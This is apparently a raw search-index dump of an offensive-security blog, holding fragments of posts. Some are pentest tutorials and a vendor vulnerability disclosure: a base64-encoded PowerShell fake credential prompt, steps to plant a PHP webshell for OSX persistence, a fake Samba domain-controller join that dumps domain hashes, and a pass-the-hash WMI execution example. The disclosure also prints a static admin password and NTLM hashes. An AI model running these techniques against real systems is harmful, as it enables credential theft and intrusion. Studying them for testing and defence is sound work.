JABjAHIAZQBkACAAPQAgACQAaABvAHMAdAAuAHUAaQAuAHAAcgBvAG0AcAB0AGYAbwByAGMAcgBlAGQAZQBuAHQAaQBhAGwAKAAnAEYAYQBpAGwAZQBkACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACcALAAnACcALABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBVAHMAZQByAEQAbwBtAGEAaQBuAE4AYQBtAGUAIAArACAAIgBcACIAIAArACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBOAGEAbQBlACwAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBEAG8AbQBhAGkAbgBOAGEAbQBlACkAOwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACQAdwBjACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsACgAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGcAZQB0AC8AMQAuADkAKwBjAHYAcwAtAHMAdABhAGIAbABlACAAKABSAGUAZAAgAEgAYQB0ACAAbQBvAGQAaQBmAGkAZQBkACkAIgApADsACgAkAHcAYwAuAFAAcgBvAHgAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsACgAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsACgAkAHcAYwAuAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBu","date":"2015-01-12","objectID":"https://malicious.link/posts/2015/powershell-popups-and-capture/:0:0","tags":["powershell","credentials"],"title":"Powershell Popups + Capture","uri":"https://malicious.link/posts/2015/powershell-popups-and-capture/"},{"categories":null,"content":"Update: I originally posted this to the Full Disclosure mailing list but for some reason it wasn’t accepted via the moderator so I’m posting it here. First, so that the information does get out there, and second to see if anyone knows why it may have been rejected. I was helping out a family member with their computer when it came up that they “already had remote help software” (SingleClickConnect or SCC), when I asked what this was, the family member said it was installed by Dell Support when trying to fix their issue. This was in 2008. I removed it, and helped to fix the issue. In 2010 another issue arose on the new computer (Dell again) of the same family member. Again, calling support first they had installed this software. Disclaimer: I can not say for certain that it was Dell’s support rep, or even that it was them that installed it, but if Dell is using this as a means of support they should probably cease for the following reasons: Apache (port 40080) listening 0.0.0.0, MySQL (port 17771) listening 127.0.0.1, PHP, and UltraVNC (5900) are installed as a part of the software package. ","date":"2014-09-15","objectID":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/:0:0","tags":["full disclosure","singleclick"],"title":"Full Disclosure - SingleClick Connect","uri":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/"},{"categories":null,"content":"ISSUE #1 Without decoding the ionCube “copyright protecting” software a large number of XSS, CSRF, and SQLi vulnerabilities were found, all unauthenticated to the web app that runs there. No specifics are being posted on these vulnerabilities as I assume the site on the net (company’s site), where a registered user would log in are the same as the ones locally hosted (at least the app looks the same and has similar page structure) ","date":"2014-09-15","objectID":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/:1:0","tags":["full disclosure","singleclick"],"title":"Full Disclosure - SingleClick Connect","uri":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/"},{"categories":null,"content":"ISSUE #2 MySQL’s root password is blank and there are two other default accounts as well allowing easy privilege escalation to SYSTEM (via the SCC local account - see ISSUE #5): dsl *7E1CA3417E3A159A9188657F44C7034A8E9FDFF2 tera *B2744A6BC5E8B1667BE5AED0111A2B941356E4A4 ^ uncracked at this point. For all I know they could be randomized at install ","date":"2014-09-15","objectID":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/:2:0","tags":["full disclosure","singleclick"],"title":"Full Disclosure - SingleClick Connect","uri":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/"},{"categories":null,"content":"ISSUE #3 Another service listens on 0.0.0.0 via port 17667 that I haven’t been able to identify, however when you connect to the socket, it starts listing users, services, printers and interfaces (and that is without sending any data to it). $ ncat 172.16.102.149 17667 8�TXPBASELINEXP_BASEP�RAdministratorGuestHelpAssistantSingleClick AdminSUPPORT_388945a0!aCACAMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport{47F69AAC-AE9A-40A9-88F5-A246A169CE92}�f� )�n�����f�f��fDownloadsC:\\Documents and Settings\\Administrator\\My Documents\\DownloadsMicrosoft XPS Document WriterXPSPortprinter#:2TPVM#:1TPVMACDWindows FirewallMicrosoftCreative Sound Blaster PCI ","date":"2014-09-15","objectID":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/:3:0","tags":["full disclosure","singleclick"],"title":"Full Disclosure - SingleClick Connect","uri":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/"},{"categories":null,"content":"ISSUE #4 When UltraVNC is installed, it uses the same password as the one for your ‘registered’ account (just password auth) and listens on 0.0.0.0. It is easily to decrypt from the UltraVNC.ini that is located in %ApplicationData% for the user ","date":"2014-09-15","objectID":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/:4:0","tags":["full disclosure","singleclick"],"title":"Full Disclosure - SingleClick Connect","uri":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/"},{"categories":null,"content":"ISSUE #5 A local account called “SingleClick Admin” is installed with a static password and added to the Administrators group. 3 services are also installed with the SingleClick Admin account as the user it runs under: Package d'authentification : NTLM Utilisateur principal : SingleClick Admin msv1_0 : lm{ 7a9793d3082ba83b790ce07b3bdf85ea }, ntlm{ 2c292724d67fcf310d1c4dd153467be8 } kerberos : ~!3no1972!~ ssp : wdigest : ~!3no1972!~ 8. Name : _SC_Apache2.2 8. Service : .\\SingleClick Admin 8. Current : ~!3no1972!~ 9. Name : _SC_dsl-fs-sync 9. Service : .\\SingleClick Admin 9. Current : ~!3no1972!~ 9. Old : ~!3no1972!~ 10. Name : _SC_hnmsvc 10. Service : .\\SingleClick Admin 10. Current : ~!3no1972!~ ","date":"2014-09-15","objectID":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/:5:0","tags":["full disclosure","singleclick"],"title":"Full Disclosure - SingleClick Connect","uri":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/"},{"categories":null,"content":"CONCERN #1 As far as I can tell the software continuously scans you local network for other computers and file system for changes and reports these back to the central server so that when you login to their service you can see your files and connect to other systems in the LAN of the machine SingleClickConnect is installed on. ","date":"2014-09-15","objectID":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/:6:0","tags":["full disclosure","singleclick"],"title":"Full Disclosure - SingleClick Connect","uri":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/"},{"categories":null,"content":"CONCERN #2 The user account password that you use to register and connect remotely is stored in the database. This actually looks decently done, or I just haven’t been able to identify the storage Database: p2p Table: config_info Value: “user_hash” ","date":"2014-09-15","objectID":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/:7:0","tags":["full disclosure","singleclick"],"title":"Full Disclosure - SingleClick Connect","uri":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/"},{"categories":null,"content":"CONCERN #3 Not sure what this registry key contains other than being named Cred4RA and assuming it’s credentials for the remote administration. Hopefully encrypted some how. [HKEY_LOCAL_MACHINE\\SOFTWARE\\SingleClick Systems\\Advanced Networking Service\\Settings\\Remote Access] \"ConfigState\"=dword:00000001 \"Cred4RA\"=hex:01,00,00 (snip snip) ","date":"2014-09-15","objectID":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/:8:0","tags":["full disclosure","singleclick"],"title":"Full Disclosure - SingleClick Connect","uri":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/"},{"categories":null,"content":"Additional Information Software original site: http://www.singleclickconnect.com/ Current site: http://www.vivedriveconnect.com/ Direct download of software (for home use): http://downloads.vivedriveconnect.com/scc_setup.exe ","date":"2014-09-15","objectID":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/:9:0","tags":["full disclosure","singleclick"],"title":"Full Disclosure - SingleClick Connect","uri":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/"},{"categories":null,"content":"Vendor Contact Email sent in 2010 July about issues 1 - 5 No reply, and forgot about until 2013 when the software was mentioned by a friend (if I had ever heard of it) 2013 April - Email sent again, forwarding original, bounced back as account unknown 2014 August - Accidentally found notes while searching for something else, attempted to relocate the software via Archive.org with the feeling that the site had gone away and happened upon the new site,, downloaded software, confirmed issues, and forwarded the email to the new point of contact at the new domain. No response. 2014 September, Full disclosure. Dell… If your techs do actually use this software for support (I hope not) in any form or fashion, you are putting each one of them at a pretty high risk. ","date":"2014-09-15","objectID":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/:10:0","tags":["full disclosure","singleclick"],"title":"Full Disclosure - SingleClick Connect","uri":"https://malicious.link/posts/2014/full-disclosure-singleclick-connect/"},{"categories":null,"content":"As I learn more and more about OSX I find things that surprise me. For instance, in this post I will be showing you how to, with root or sudo priviledge, enable the built-in apache server on OSX and it’s PHP module…. I am working with OSX Mavericks so your locations may vary based on the version of OSX your target it. First things first is to enable the PHP module for the Apache server. sudo nano -w /etc/apache2/httpd.conf (vi or emacs to your heart’s content). But what we are looking for is to uncomment the following line: #LoadModule php5_module libexec/apache2/libphp5.so Once you do that, start up Apache. This can be done temporarily (won’t survive a reboot) with the apachectl command: sudo apachectl start Or you can make it more permanent with launchctl: sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist And undoing the damage with: sudo launchctl unload -w /System/Library/LaunchDaemons/org.apache.httpd.plist After that, just drop your favorite PHP shell into the /Library/WebServer/Documents/ directory and you’re done. (My favorites are b374k and PHP Meterpreter. ","date":"2014-09-09","objectID":"https://malicious.link/posts/2014/osx-persistence-via-php-webshell/:0:0","tags":["osx","persistence","php"],"title":"OSX Persistence via PHP Webshell","uri":"https://malicious.link/posts/2014/osx-persistence-via-php-webshell/"},{"categories":null,"content":"One of the problems with using PSEXEC from Metasploit (any of the psexec modules) is that it runs as SYSTEM. What’s the problem with that? Isn’t SYSTEM god mode? Ya, and normally I’d agree that it’s the best level to have, but the defenses these days have gotten better, and getting direct connections out is pretty rare. That leaves proxies, and as you know SYSTEM doesn’t get any proxy settings. Here is a blog post that I made about setting the proxies for SYSTEM but leaving settings like this set is not only sloppy but hard to clean up. Along comes RunAsCurrentUser-2.0.3.1.exe I found this gem by messing up a search on google for RunAsUser. Found it on this IBM support post. Link to direct download: http://software.bigfix.com/download/bes/util/RunAsCurrentUser-2.0.3.1.exe Here is a mirror uploaded to my Post Exploitation repo: https://github.com/mubix/post-exploitation/blob/master/win32bins/RunAsCurrentUser-2.0.3.1.exe This binary takes a path to another executable as an argument. It then finds the currently logged in user and starts the provided executable as that user. AWESOME! This basically solves the whole PSEXEC-\u003eSYSTEM no-proxy settings issue. And it’s created by a legitimate company for legitimate reasons? w00tw00t. Game on! Only two problems: It is 335K, which doesn’t seem like much but over high latency lines that can take an eternity to transfer, especially over doubly encrypted channels like with a reverse_https meterpreter session. It takes an argument which normally isn’t a huge challenge, but in our specific use case, psexec modules in Metasploit, it isn’t something we can do easily. You would have to upload your C2 binary, as well as the 335K RunAsCurrentUser over to the target host, then run the psexec_command module to execute them both, one as the argument of the other. Kinda sloppy. So I set to try and figure out how this binary did it’s magic. As I’m not much of a reverse engineer I uploaded it to VirusTotal so I could take a look at it’s insides (plus, double check to see if it was being detected as malicious at all). As far as I can tell the important pieces are the Windows API calls ImpersonateLoggedOnUser, and CreateProcessAsUserA. I set to trying to reproduce what it did in AutoIT (awesome stuff if you have never checked it out). I couldn’t quite get the API calls right, so I decided to give C++ a shot. Turned out to be pretty simple. I present to you “Milkman”: https://gist.github.com/mubix/5d0cacdabfe092922fa3 (full source included below) This program (once compiled) takes one argument (or none at all) and runs calc.exe for every instance of the process you tell it to. If you run it without arguments it auto selects explorer.exe. So if you create a service: C:\\temp\\\u003esc create SuperService binpath= C:\\Temp\\milkman.exe type= own start= auto [SC] CreateService SUCCESS It will start up every time the computer starts, which is completely useless, since there won’t be any users logged in at that point, but you get where this can go. Features to add to this at point are: Create a service binary that responds to START/STOP/PAUSE commands and such so that running this as a persistence method would actually be useful. Add a loop so that it continues to run checking for explorer.exe every so often so it can catch when someone is logged in. Finally the obvious one is to change it from being calc.exe that it runs by accepting another argument or some other kind of config option. Thoughts? What would you like Milkman to do, or what use case do you think a tweak would make it work better for? Leave a comment below. ","date":"2014-08-14","objectID":"https://malicious.link/posts/2014/milkman-creating-processes-as-any-currently-logged-in-user/:0:0","tags":["code","psexec","milkman","windows"],"title":"Milkman: Creating processes as any currently logged in user","uri":"https://malicious.link/posts/2014/milkman-creating-processes-as-any-currently-logged-in-user/"},{"categories":null,"content":"Anyone who knows me knows that I live in a tiny world of offensive security, so much so that I miss large world events entirely. (Like elections and hurricanes) I didn’t know Aaron Swartz, or even 1% of what he was doing in the world to make it a better place and for that I am ashamed. I will do better, to look around, see what needs to be changed in this world and make it a reality. The following is a Documentary about the life of Aaron Swartz. If you live under a similar rock as I, you can start here: http://en.wikipedia.org/wiki/Aaron_Swartz Watch, learn, share, and help continue a legacy that Aaron started. ","date":"2014-07-10","objectID":"https://malicious.link/posts/2014/the-internets-own-boy/:0:0","tags":["rant","freedom","life"],"title":"The Internets Own Boy","uri":"https://malicious.link/posts/2014/the-internets-own-boy/"},{"categories":null,"content":"This talk really touched home with me and I wanted to share it, and not just because he talked about Marines. ;-) Forward this talk on to your fellow employees, boss, etc. ","date":"2014-05-27","objectID":"https://malicious.link/posts/2014/why-good-leaders-make-you-feel-safe/:0:0","tags":["ted","video"],"title":"Why good leaders make you feel safe","uri":"https://malicious.link/posts/2014/why-good-leaders-make-you-feel-safe/"},{"categories":null,"content":"Let me start off by saying this post is easy for me to write in one facet as I’ve never been a heavy drinker or much enjoyed the taste of alcohol. So if you need a reason to disregard what I say next, I leave the door open. I am still pretty much a runt in the infosec community as I didn’t even begin learning computers (outside of playing games on them) until 2005. However, one thing that has nagged at me for a long time is the intertwined nature of hacking/infosec and drinking. Its almost a right of passage in the common fraternity style. The problem lies in the fact that you don’t really “graduate” and leave those parties behind. Now, I have certainly partaken in my share of parties and consumption, even with that nagging feeling in the back of my head. It didn’t really take root until just recently. I was at a conference where a student (who was not 21) that looked very much like an older version of my oldest child said that he was going to skip dinner to go get wasted with XYZ “Infosec Rockstar”. That scared me into thinking that if my son goes into Infosec he will be basically expected to drink like an alcoholic. How can I want my kid to be expected (not forced) to drink a shot on stage if he gets accepted to speak at DEF CON. We (the infosec community) are few, and we loose too many to idiotic things like drug overdose, drinking and driving, and other stupidly preventable crap. For that reason I actually don’t want to share the thing I feel so passionate about with my own kids. My call to action is this: If you are a conference goer, try going one con completely dry, and if you already do, maybe ask friend to join you. If you are speaker, enough of the drinks on stage and drinking games. Do you really want the next generation, those you are trying to teach, to remember that part of your talk instead of the rest? If you are a conference organizer, maybe a completely dry day at the con? or an AA meeting space? If you are a podcaster, if you drink during the cast, make it about the taste and selection, instead of how wasted and totally useless the next hour of your listeners life will be. ShmooCon runs an AA meeting at the con Lets stop losing our friends and family because we are too weak to say ’no thank you’ when someone approaches the dais with a shot. ","date":"2014-05-26","objectID":"https://malicious.link/posts/2014/go-home-infosec-youre-drunk/:0:0","tags":["rant"],"title":"Go home InfoSec, you're drunk","uri":"https://malicious.link/posts/2014/go-home-infosec-youre-drunk/"},{"categories":null,"content":"Keeping it here for notes and just in case anyone else runs into this same issue. brew install pip sudo ARCHFLAGS=-Wno-error=unused-command-line-argument-hard-error-in-future pip install pycrypto If you have a better way please leave a comment below! ","date":"2014-05-21","objectID":"https://malicious.link/posts/2014/installing-pycrypto-on-osx-mavericks/:0:0","tags":["python","osx","pycrypto","mavericks"],"title":"Installing PyCrypto on OSX Mavericks","uri":"https://malicious.link/posts/2014/installing-pycrypto-on-osx-mavericks/"},{"categories":null,"content":"SMB Relay has been around for a long while. I even have a post about using it along with LNK files here: MS08-068 + MS10-046 = Fun until 2018 Here is the problem though. Most of the tools to exploit it either catch the authentication in NTLMv2/NTLMv1 (which is not always easy to crack) or assume administrative access (because they attempt to PSEXEC with the incoming session). Well, since MS08-068 thats much harder to pin down. You have to know who is going to hit your relay server and what other location they might be an admin on. You also have to a service you want to run on that target. ","date":"2014-05-21","objectID":"https://malicious.link/posts/2014/effective-ntlm-smb-relaying/:0:0","tags":["zackattack","smbrelay","video","responder","smb","impacket"],"title":"Effective NTLM / SMB Relaying","uri":"https://malicious.link/posts/2014/effective-ntlm-smb-relaying/"},{"categories":null,"content":"Current Tools: SMBRelay SMBRelay3 SpiderLabs Responder SMBRelayX in Impacket HTTP NTLM Relay Metasploit Module SMB Relay PSExec Metasploit Module Oracle SMB Relay Metasploit Module SAP SMB Relay Metasploit Module ","date":"2014-05-21","objectID":"https://malicious.link/posts/2014/effective-ntlm-smb-relaying/:1:0","tags":["zackattack","smbrelay","video","responder","smb","impacket"],"title":"Effective NTLM / SMB Relaying","uri":"https://malicious.link/posts/2014/effective-ntlm-smb-relaying/"},{"categories":null,"content":"“Soft” relay tools: Now, some would argue that you just spin up the relay at a target then leave it until one pops. I’m not really a fan of that. You will not only be creating multiple access attempt log entries, but you are also just throwing away all of those user authentication attempts. There are 3 tools that agree with me. Squirtle * Squirtle is awesome plus it’s written in a language I understand (ruby) but it has one serious downfall, many of the post-auth features are left up to the user to develop. It does have a great API but needs some coding to get to do certain things. Intercepter-NG * I have tested Interceptre-NG out a lot and it has some fantastic features, not to mention that it does relaying on a Windows host, which is impressive all by itself (due to 445 default bind). My only problem with it is that it’s closed source. But definitely recommended. The 3rd is a tool called “ZackAttack” by Zack Fasel, you can find it here on Github:ZackAttack. You can find the video of the talk releasing this tool on Youtube. So what is so special about this tool? Other than the fact that most of the web interface is broken horribly it has this amazing bit of code that acts as a SOCKS proxy. This SOCKS proxy identifies SMB or HTTP traffic that has NTLM authentication going on and rewrites it based on captured sessions. What does this mean? If I use SpiderLab’s Responder, for instance, to spoof/get/fake a bunch of users into connecting to my machine via automatic or forced methods to the capture/keep services that ZackAttack spins up, I can then run smbclient or Outlook or Web browser, push it through the ZackAttack SOCKS proxy, pick a username out of the captured names, and use any password I want when asked, and the SOCKS proxy will automatically replace it en route with the valid session information. This way I can use every authentication that comes in to its highest potential for pwnage. The video below shows how this can be used to connect to a “Network share” Update: One thing to mention that ZackAttack does that I haven’t seen other tools do, even Squirtle or Intercepter-NG is getting 3+ successful authentications out of a single relay from a user. ZackAttack does this with some clever HTTP Keep-Alive and SMB “reauth” kung fu. ","date":"2014-05-21","objectID":"https://malicious.link/posts/2014/effective-ntlm-smb-relaying/:2:0","tags":["zackattack","smbrelay","video","responder","smb","impacket"],"title":"Effective NTLM / SMB Relaying","uri":"https://malicious.link/posts/2014/effective-ntlm-smb-relaying/"},{"categories":null,"content":"Other References: 2014-02 SpiderLabs - Responder 2.0 Owning Windows Networks Part 3 2014-01 NetSPI Blog - SMB Attacks Through Directory Traversal 2013-06 Ares - SMB Hijacking Kerberos is defeated 2013-04 SANS Pentesting Blog - SMB Relay Demystified and NTLMv2 Pwnage with Python 2013-01 Core Security Training Video - How To Perform a SMB Relay Attack 2013-01 Mark Gamache - NTLM Challenge Response is 100% Broken 2012-12 NetSPI Blog - Executing SMB Relay Attacks via SQL Server using Metasploit 2012-07 WebstersProdigy - Metasploit Generic NTLM Relay Module 2012-04 Ares - Actuality of SMBRelay in Modern Windows Networks 2011-01 Digital Security Research Group Blog - SMBRelay Bible 2009-07 Carnal0wnage - Metasploit Oracle TNSCMD SMBRelay Demo 2008-11 Ron Bowes - Preventing SMB Relay Attacks 2008-08 Kurt Grutzmacher at DEF CON 16 - NTLM is Dead! 2008-06 John Heasman - Stealing Password Hashes with Java and IE 2008-04 Eric Rachner: NTLM Relay Attacks - Released tool ‘scurvy’ 2007-08 HD Moore and Valsmith - Tactical Exploitation 2004-12 (ARCHIVE.ORG) Jesse Burns at SySCAN - NTLM Authentication Unsafe 2002-01 Azbil SecurityFriday Ltd - ScoopLM 2001-03 @lantaCon - Reference from March 31 2001 talk I tried finding all the original/semi original references about SMB (LM/NTLM) Relaying. If you have others please leave a comment below so I can add them to the list. ","date":"2014-05-21","objectID":"https://malicious.link/posts/2014/effective-ntlm-smb-relaying/:3:0","tags":["zackattack","smbrelay","video","responder","smb","impacket"],"title":"Effective NTLM / SMB Relaying","uri":"https://malicious.link/posts/2014/effective-ntlm-smb-relaying/"},{"categories":null,"content":"This is my box. There are many like it, but they are all mine. My malware is my best friend. It is my life. I must master it as I must master my life. My malware, without me, is useless. Without my malware, I am useless. I must drop my malware true. I must rootkit better than my enemy who is trying to kill my binary. I must kit him before he kits me. I will… My malware and I know that what counts in this war is not the boxes we pop, the noise of our root dance, nor the cheers coming from the Red Team room. We know that it is the root that count. We will root… My malware is human, even as I, because it is my life. Thus, I will learn it as a brother. I will learn its weaknesses, its strength, its parts, its extensions, its dlls and its exes. I will keep my malware av free and ready, even as I am ready. We will become part of each other. We will… Before God, I swear this creed. My malware and I are the defenders of my botnet. We are the masters of our enemy. We are the saviors of my shells. So be it, until victory is the Red Team’s and there is no enemy, but peace! ","date":"2014-05-20","objectID":"https://malicious.link/posts/2014/2014-05-20-ccdc-red-teamers-creed/:0:0","tags":null,"title":"CCDC Red Teamer's Creed","uri":"https://malicious.link/posts/2014/2014-05-20-ccdc-red-teamers-creed/"},{"categories":["samba","ntds.dit","passwords"],"content":"So there was this blog post that talking about a number of ways to dump windows credentials by @lanjelot [definitly someone to follow] - here: https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/ and at the very bottom of this post it says “AD Replication (EXPERIMENTAL)” What it boils down to is if you can position a system that can do DNS resolution to the target domain, and perform some other UDP traffic, you can fake join a samba server you control to a domain and it doesn’t require code execution in any way on the domain controller. Notice: I am not doing this on a Kali Linux box, there is already an install of Samba there and I didn’t want to try uninstalling or modifying the one installed. First, you need this patch: wget http://files.securusglobal.com/samba-4.1.0_replication-only-patch.txt and Samba 4.1.0 wget http://ftp.samba.org/pub/samba/stable/samba-4.1.0.tar.gz You will probably also require some dependencies to be installed: apt-get install python2.7-dev python-samba libacl1-dev build-essential libldap2-dev libkrb5-dev attr Since the patch is kinda wonky, you need to make a src directory and extract samba into there first. Then apply the patch in whatever directory is above src mkdir src mv samba-4.1.0.tar.gz src/ cd src/ tar zxvf samba-4.1.0.tar.gz cd /root/ So it would look like this: samba-4.1.0_replication-only-patch.txt src/ src/samba-4.1.0/ then run patch -p0 \u003c samba-4.1.0_replication-only-patch.txt cd ./src/samba-4.1.0/ ./configure make make install Prepare the box: rm -rf /var/lib/samba; mkdir /var/lib/samba; rm -f /etc/samba/smb.conf Next you need to make sure you are resolving correctly (if you can’t resolve the SRV record _ldap._tcp.sittingduck.info (sittingduck.info being the domain) then this isn’t going to work. echo nameserver 192.168.92.37 \u003e /etc/resolv.conf # this is the IP address of the DC Then start the clone: /usr/local/samba/bin/samba-tool domain join sittingduck.info DC -U sittingduck\\\\administrator Looks like this: root@sambabox:~/src/samba-4.1.0# /usr/local/samba/bin/samba-tool domain join sittingduck.info DC -U sittingduck\\\\administrator Finding a writeable DC for domain 'sittingduck.info' Found DC 2K8DC.sittingduck.info Password for [SITTINGDUCK\\administrator]: workgroup is SITTINGDUCK realm is sittingduck.info Calling bare provision No IPv6 address will be assigned Provision OK for domain DN DC=sittingduck,DC=info Starting replication Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[402] linked_values[0] Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[804] linked_values[0] Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[1206] linked_values[0] Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[1521] linked_values[0] Analyze and apply schema objects Partition[CN=Configuration,DC=sittingduck,DC=info] objects[402] linked_values[0] Partition[CN=Configuration,DC=sittingduck,DC=info] objects[804] linked_values[0] Partition[CN=Configuration,DC=sittingduck,DC=info] objects[1206] linked_values[0] Partition[CN=Configuration,DC=sittingduck,DC=info] objects[1608] linked_values[1] Partition[CN=Configuration,DC=sittingduck,DC=info] objects[1614] linked_values[11] Replicating critical objects from the base DN of the domain Partition[DC=sittingduck,DC=info] objects[100] linked_values[24] Partition[DC=sittingduck,DC=info] objects[353] linked_values[27] Done with always replicated NC (base, config, schema) Committing SAM database descriptor_sd_propagation_recursive: DC=DomainDnsZones,DC=sittingduck,DC=info not found under DC=sittingduck,DC=info descriptor_sd_propagation_recursive: DC=ForestDnsZones,DC=sittingduck,DC=info not found under DC=sittingduck,DC=info Joined domain SITTINGDUCK (SID S-1-5-21-3147519476-3247671789-820278723) as a DC Then to get the hashes: root@sambabox:~# /usr/local/samba/bin/pdbedit -L -w 2K8DC$:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:CB14F1166BBE1749AC0FB40240C5DC30:[S ]","date":"2014-05-14","objectID":"https://malicious.link/posts/2014/2014-05-14-dumping-ntds-dot-dit-domain-hashes-using-samba/:0:0","tags":null,"title":"Dumping NTDS.dit domain hashes using Samba","uri":"https://malicious.link/posts/2014/2014-05-14-dumping-ntds-dot-dit-domain-hashes-using-samba/"},{"categories":["wmi","wmis","impacket"],"content":"PSEXEC has been a staple for Windows post exploitation pivoting and system administration for a long while. The basic premise of how all “psexec” tools work is: (Optional) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal’s tool) to the ADMIN$ share Connect to the service manager on the remote host, and create a service based on either a local (to the remote system) executable or the uploaded one. Run the service Stop and delete the service and uploaded file pulling down the resulting output if any from the execution. Now, as you can guess, the uploading of a file, creating, starting, stopping, and deletion of services create quite the logs and forensic evidence. As you might imagine, thats not the best thing for us on the offensive side of infosec. Luckily big brother Microsoft provides another option, WMI (Windows Management Interface). I demonstrated the use of this in the past: HERE and HERE The downside to using the WMIC directly is that you need a valid token or a valid password for it to work. Passing the hash didn’t used to be an available option. That has changed with the “wmis” package on Kali Linux that incorporates the “Pass-the-Hash for 15 years toolkit” (There is a slight problem where you have to play with it a bit to get it working on 64 bit Kali) The other solution is supplied as an example in the Impacket library “wmiexec.py”. In my experience there are a few features that make it the better option. Installing it on a random VPS is dead simple and doesn’t need the Kali repos to get right, nor Debian/Ubuntu. It defaults to an “semi-interactive shell” which writes and reads output from the ADMIN$ shell by default. Something I would normally have to do manually with a bunch of tools As with the WMIS package, it allows you to just create a process without the ADMIN$ write/read. Enough crazy talk here is an example usage of each: ","date":"2014-04-19","objectID":"https://malicious.link/posts/2014/2014-04-19-executing-code-via-smb-without-psexec/:0:0","tags":null,"title":"Executing code via SMB / DCOM without PSEXEC","uri":"https://malicious.link/posts/2014/2014-04-19-executing-code-via-smb-without-psexec/"},{"categories":["wmi","wmis","impacket"],"content":"WMIS ","date":"2014-04-19","objectID":"https://malicious.link/posts/2014/2014-04-19-executing-code-via-smb-without-psexec/:1:0","tags":null,"title":"Executing code via SMB / DCOM without PSEXEC","uri":"https://malicious.link/posts/2014/2014-04-19-executing-code-via-smb-without-psexec/"},{"categories":["wmi","wmis","impacket"],"content":"Usage: root@wpad:~# wmis Usage: [-?NPV] [-?|--help] [--usage] [-d|--debuglevel=DEBUGLEVEL] [--debug-stderr] [-s|--configfile=CONFIGFILE] [--option=name=value] [-l|--log-basename=LOGFILEBASE] [--leak-report] [--leak-report-full] [-R|--name-resolve=NAME-RESOLVE-ORDER] [-O|--socket-options=SOCKETOPTIONS] [-n|--netbiosname=NETBIOSNAME] [-W|--workgroup=WORKGROUP] [--realm=REALM] [-i|--scope=SCOPE] [-m|--maxprotocol=MAXPROTOCOL] [-U|--user=[DOMAIN\\]USERNAME[%PASSWORD]] [-N|--no-pass] [--password=STRING] [-A|--authentication-file=FILE] [-S|--signing=on|off|required] [-P|--machine-pass] [--simple-bind-dn=STRING] [-k|--kerberos=STRING] [--use-security-mechanisms=STRING] [-V|--version] //host Example: wmis -U [domain/]adminuser%password //host cmd.exe /c dir c:\\ \u003e c:\\windows\\temp\\output.txt ","date":"2014-04-19","objectID":"https://malicious.link/posts/2014/2014-04-19-executing-code-via-smb-without-psexec/:1:1","tags":null,"title":"Executing code via SMB / DCOM without PSEXEC","uri":"https://malicious.link/posts/2014/2014-04-19-executing-code-via-smb-without-psexec/"},{"categories":["wmi","wmis","impacket"],"content":"Example: root@wpad:~# wmis -U administrator%aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 //172.16.102.141 calc.exe HASH PASS: Substituting user supplied NTLM HASH... HASH PASS: Substituting user supplied NTLM HASH... [wmi/wmis.c:172:main()] 1: calc.exe NTSTATUS: NT_STATUS_OK - Success 